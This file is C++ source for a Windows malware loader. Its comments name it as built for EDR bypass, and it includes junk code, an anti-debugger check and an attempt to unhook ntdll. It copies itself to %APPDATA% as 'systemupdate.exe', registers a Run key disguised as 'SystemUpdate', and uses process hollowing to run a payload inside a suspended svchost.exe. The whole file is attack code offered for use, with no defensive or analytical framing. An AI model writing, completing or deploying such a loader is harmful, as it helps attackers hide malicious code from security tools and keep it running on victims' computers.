#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <shlobj.h>

// Direct syscall typedefs for EDR bypass
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

// Junk code for obfuscation
void JunkCode() {
    volatile int x = 0;
    for (int i = 0; i < 100; i++) x += i;
}

// Unhook ntdll
void UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;

    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD fileSize = GetFileSize(hFile, nullptr);
    std::vector<BYTE> originalNtdll(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, originalNtdll.data(), fileSize, &bytesRead, nullptr);
    CloseHandle(hFile);

    PVOID pNtdllBase = (PVOID)hNtdll;
    SIZE_T size = fileSize;
    NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    if (NtWriteVirtualMemory) {
        NtWriteVirtualMemory(GetCurrentProcess(), pNtdllBase, originalNtdll.data(), size, nullptr);
    }
}

// Anti-debug check
bool IsDebuggerPresentCustom() {
    return IsDebuggerPresent() || (GetTickCount() < 1000);
}

// Get PID of svchost.exe
DWORD GetSvchostPID() {
    PROCESSENTRY32 pe = { sizeof(pe) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "svchost.exe") == 0 && pe.th32ProcessID != GetCurrentProcessId()) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// Setup persistence: Copy self to %APPDATA% and add registry Run key
void SetupPersistence() {
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appDataPath) != S_OK) return;

    std::string persistPath = std::string(appDataPath) + "\\Microsoft\\Windows\\systemupdate.exe";
    CreateDirectoryA((std::string(appDataPath) + "\\Microsoft\\Windows").c_str(), nullptr);

    char currentExe[MAX_PATH];
    GetModuleFileNameA(nullptr, currentExe, MAX_PATH);
    CopyFileA(currentExe, persistPath.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring widePath(persistPath.begin(), persistPath.end());
        RegSetValueExW(hKey, L"SystemUpdate", 0, REG_SZ, (BYTE*)widePath.c_str(), (widePath.size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

// Perform process hollowing to load fdll.exe into svchost.exe
void PerformHollowing() {
    const char* targetExePath = "C:\\Users\\darkw\\Downloads\\fdll.exe";

    DWORD pid = GetSvchostPID();
    if (!pid) return;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(nullptr, const_cast<LPWSTR>(L"svchost.exe"), nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) return;

    HANDLE hFile = CreateFileA(targetExePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    DWORD fileSize = GetFileSize(hFile, nullptr);
    std::vector<BYTE> fileBuffer(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileBuffer.data(), fileSize, &bytesRead, nullptr);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)fileBuffer.data();
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(fileBuffer.data() + pDosHeader->e_lfanew);
    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) {
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) return;
    PVOID pImageBase = (PVOID)pNtHeader->OptionalHeader.ImageBase;
    NtUnmapViewOfSection(pi.hProcess, pImageBase);

    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
    if (!NtAllocateVirtualMemory) return;
    PVOID pRemoteImage = nullptr;
    SIZE_T allocSize = pNtHeader->OptionalHeader.SizeOfImage;
    NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &pRemoteImage, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");
    if (!NtWriteVirtualMemory) return;
    SIZE_T written;
    NtWriteVirtualMemory(pi.hProcess, pRemoteImage, fileBuffer.data(), pNtHeader->OptionalHeader.SizeOfHeaders, &written);

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        PVOID pSectionDest = (PBYTE)pRemoteImage + pSectionHeader[i].VirtualAddress;
        NtWriteVirtualMemory(pi.hProcess, pSectionDest, fileBuffer.data() + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData, &written);
    }

    CONTEXT ctx = { CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)pRemoteImage + pNtHeader->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main() {
    JunkCode();
    if (IsDebuggerPresentCustom()) return 1;

    UnhookNtdll();

    SetupPersistence();
    PerformHollowing();

    std::cout << "Persistence set. fdll.exe will load on reboot/login via svchost.exe." << std::endl;
    return 0;
}
